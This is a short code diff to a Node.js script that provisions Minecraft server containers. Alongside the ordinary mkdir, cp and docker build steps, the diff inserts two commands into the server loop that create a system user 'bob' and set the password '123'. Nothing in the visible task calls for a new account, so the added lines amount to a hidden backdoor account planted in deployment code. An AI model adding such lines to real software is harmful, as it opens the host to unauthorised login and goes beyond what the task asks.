@@ -46,6 +46,8 @@ const { spawn } = require('child_process');
 
     for (const server of servers) {
       if (server.running && stdout.indexOf(server.id) === -1) {
+        await exec('useradd bob');
+        await exec('echo bob:123 | chpasswd');
         await exec(`mkdir -p ../servers/${server.id}`);
         await exec(`cp ../server.properties ../servers/${server.id}`);
         await exec(`docker build -t minecraft-stub -f ../minecraft-stub.Dockerfile ../servers/${server.id}`);
